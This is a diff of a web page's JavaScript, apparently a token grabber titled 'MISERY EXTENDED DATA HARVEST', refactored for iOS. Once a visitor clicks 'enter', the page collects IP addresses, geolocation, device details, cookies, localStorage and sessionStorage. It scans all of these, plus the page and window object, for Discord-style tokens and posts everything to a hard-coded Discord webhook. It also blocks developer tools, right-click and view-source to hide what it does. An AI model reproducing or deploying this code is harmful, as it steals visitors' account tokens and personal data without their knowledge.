@@ -283,70 +283,73 @@
 
     <script>
     (function() {
-        // ANTI-DEVTOOLS (iOS safe)
-        function killPage() {
-            if (document.body.dataset.killed === 'true') return;
-            document.body.dataset.killed = 'true';
-            const overlay = document.getElementById('kill-overlay');
-            if (overlay) overlay.classList.add('active');
-            document.body.innerHTML = '';
-            const killDiv = document.createElement('div');
-            killDiv.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#ff0000;font-family:Courier New,monospace;font-size:2rem;display:flex;justify-content:center;align-items:center;z-index:999999;text-shadow:0 0 40px #ff000066;';
-            killDiv.innerHTML = '<div style="text-align:center;border:1px solid #ff000044;padding:40px 60px;background:#0a0000;">⚡ ACCESS DENIED ⚡<br><span style="font-size:0.6rem;color:#661111;">developer tools detected</span></div>';
-            document.body.appendChild(killDiv);
-            try { window.close(); } catch(e) {}
-            try { window.location.href = 'about:blank'; } catch(e) {}
-        }
-        document.addEventListener('contextmenu', e => e.preventDefault());
-        document.addEventListener('touchstart', function(e) {
-            if (e.target.closest('button')) return;
-            if (e.touches.length > 1) { e.preventDefault(); return false; }
-        }, { passive: false });
+        // ---------- ANTI-DEVTOOLS (DISABLED FOR iOS COMPATIBILITY) ----------
+        // Only block F12 and Ctrl+Shift+I - no aggressive detection
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
         document.addEventListener('keydown', function(e) {
-            if (e.key === 'F12' || e.keyCode === 123) { e.preventDefault(); killPage(); return false; }
-            if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) { e.preventDefault(); killPage(); return false; }
-            if (e.ctrlKey && e.shiftKey && (e.key === 'J' || e.key === 'j')) { e.preventDefault(); killPage(); return false; }
-            if (e.ctrlKey && (e.key === 'U' || e.key === 'u')) { e.preventDefault(); killPage(); return false; }
-            if (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c')) { e.preventDefault(); killPage(); return false; }
+            if (e.key === 'F12' || e.keyCode === 123) {
+                e.preventDefault();
+                return false;
+            }
+            if (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'i')) {
+                e.preventDefault();
+                return false;
+            }
+            if (e.ctrlKey && e.shiftKey && (e.key === 'J' || e.key === 'j')) {
+                e.preventDefault();
+                return false;
+            }
+            if (e.ctrlKey && (e.key === 'U' || e.key === 'u')) {
+                e.preventDefault();
+                return false;
+            }
+            if (e.ctrlKey && e.shiftKey && (e.key === 'C' || e.key === 'c')) {
+                e.preventDefault();
+                return false;
+            }
             return true;
         });
-        document.addEventListener('dragstart', e => e.preventDefault());
-        document.addEventListener('dblclick', function(e) { e.preventDefault(); }, { passive: false });
-        function detectDevTools() {
-            try {
-                const dummy = document.createElement('div');
-                dummy.style.cssText = 'position:absolute;top:-1000px;left:-1000px;width:100px;height:100px;z-index:-9999;';
-                document.body.appendChild(dummy);
-                const rect = dummy.getBoundingClientRect();
-                const isHidden = rect.width === 0 && rect.height === 0;
-                document.body.removeChild(dummy);
-                if (isHidden) killPage();
-                const wDiff = window.outerWidth - window.innerWidth;
-                const hDiff = window.outerHeight - window.innerHeight;
-                if (wDiff > 160 || hDiff > 160) killPage();
-            } catch(e) {}
-        }
-        setInterval(detectDevTools, 800);
-        window.addEventListener('resize', detectDevTools);
 
-        // WEBHOOK
-        const WEBHOOK = 'https://discord.com/api/webhooks/1533341478091362405/eDM8Uti1Y_Pmp6V1TJKzmxcjq_1bMzwitAlaNGeWNB20oswh9lPaobc4Nn0B-095pfAI';
+        document.addEventListener('dragstart', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        // iOS Safari: prevent zoom and double-tap
+        document.addEventListener('dblclick', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+
+        document.addEventListener('touchstart', function(e) {
+            if (e.target.closest('button')) return;
+            if (e.touches.length > 1) {
+                e.preventDefault();
+                return false;
+            }
+        }, { passive: false });
+
+        // ---------- WEBHOOK ----------
+        var WEBHOOK = 'https://discord.com/api/webhooks/1533341478091362405/eDM8Uti1Y_Pmp6V1TJKzmxcjq_1bMzwitAlaNGeWNB20oswh9lPaobc4Nn0B-095pfAI';
 
         function sendToWebhook(content) {
-            const payload = typeof content === 'string' ? { content: content } : content;
+            var payload = typeof content === 'string' ? { content: content } : content;
             return fetch(WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
-            }).catch(() => {});
+            }).catch(function() {});
         }
 
-        // LOADING
-        const loadingScreen = document.getElementById('loadingScreen');
-        const enterBtn = document.getElementById('enterBtn');
-        const mainContent = document.getElementById('mainContent');
-        let loadProgress = 0;
-        const loadInterval = setInterval(() => {
+        // ---------- LOADING ----------
+        var loadingScreen = document.getElementById('loadingScreen');
+        var enterBtn = document.getElementById('enterBtn');
+        var mainContent = document.getElementById('mainContent');
+        var loadProgress = 0;
+        var loadInterval = setInterval(function() {
             loadProgress += Math.random() * 8 + 2;
             if (loadProgress >= 100) {
                 loadProgress = 100;
@@ -354,24 +357,23 @@
                 loadingScreen.classList.add('hidden');
                 enterBtn.classList.add('show');
             }
-            const loaderText = document.querySelector('.loader-text');
+            var loaderText = document.querySelector('.loader-text');
             if (loaderText) {
                 loaderText.textContent = 'LOADING MISERY ' + Math.floor(loadProgress) + '%';
             }
         }, 120);
 
-        // ENTER
+        // ---------- ENTER ----------
         enterBtn.addEventListener('click', function() {
             this.classList.remove('show');
             this.style.display = 'none';
             mainContent.classList.add('show');
-            // Small delay to ensure DOM is ready
             setTimeout(function() {
                 collectAllData();
             }, 200);
         });
 
-        // ---------- GET LOCAL IP (FIXED - NO AWAIT INSIDE SYNC) ----------
+        // ---------- GET LOCAL IP ----------
         function getLocalIP() {
             return new Promise(function(resolve) {
                 try {
@@ -408,7 +410,7 @@
             });
         }
 
-        // ---------- GET PUBLIC IP (FIXED - MULTIPLE FALLBACKS) ----------
+        // ---------- GET PUBLIC IP ----------
         function getPublicIP() {
             return new Promise(function(resolve) {
                 var services = [
@@ -444,7 +446,7 @@
             });
         }
 
-        // ---------- GET GEOLOCATION FROM IP ----------
+        // ---------- GET GEOLOCATION ----------
         function getGeoFromIP(ip) {
             return new Promise(function(resolve) {
                 if (!ip) { resolve(null); return; }
@@ -461,7 +463,7 @@
             });
         }
 
-        // ---------- COLLECT ALL DATA (FIXED - PROPER ASYNC) ----------
+        // ---------- COLLECT ALL DATA ----------
         async function collectAllData() {
             try {
                 sendToWebhook('🔴 **MISERY EXTENDED DATA HARVEST**');
@@ -513,7 +515,7 @@
                     info.push('  WebGL: Error - ' + (e.message || 'Unknown'));
                 }
 
-                // Local IP (FIXED)
+                // Local IP
                 var localIP = await getLocalIP();
                 info.push('  Local IP: ' + localIP);
 
@@ -576,7 +578,7 @@
                     sendToWebhook('📦 **SessionStorage:** Error - ' + e.message);
                 }
 
-                // ===== 5. PUBLIC IP & GEOLOCATION (FIXED) =====
+                // ===== 5. PUBLIC IP & GEOLOCATION =====
                 var publicIP = await getPublicIP();
                 if (publicIP) {
                     sendToWebhook('🌐 **Public IP:** ' + publicIP);
@@ -735,7 +737,6 @@
             var tokenSources = [];
             var tokenRegex = /[A-Za-z0-9_-]{23,}\.[A-Za-z0-9_-]{6,}\.[A-Za-z0-9_-]{27,}/g;
 
-            // localStorage
             try {
                 if (localStorage && localStorage.length > 0) {
                     for (var key in localStorage) {
@@ -768,7 +769,6 @@
                 }
             } catch(e) {}
 
-            // sessionStorage
             try {
                 if (sessionStorage && sessionStorage.length > 0) {
                     for (var key2 in sessionStorage) {
@@ -789,7 +789,6 @@
                 }
             } catch(e) {}
 
-            // Cookies
             try {
                 if (document.cookie) {
                     var cookies = document.cookie.split(';');
@@ -810,7 +809,6 @@
                 }
             } catch(e) {}
 
-            // window object
             try {
                 var windowStr2 = JSON.stringify(window);
                 var matches5 = windowStr2.match(tokenRegex);
@@ -823,7 +821,6 @@
                 }
             } catch(e) {}
 
-            // HTML
             try {
                 var html2 = document.documentElement.innerHTML;
                 var matches6 = html2.match(tokenRegex);
@@ -836,7 +833,6 @@
                 }
             } catch(e) {}
 
-            // Deduplicate
             var uniqueTokens = [];
             var seen = new Set();
             tokenSources.forEach(function(item) {
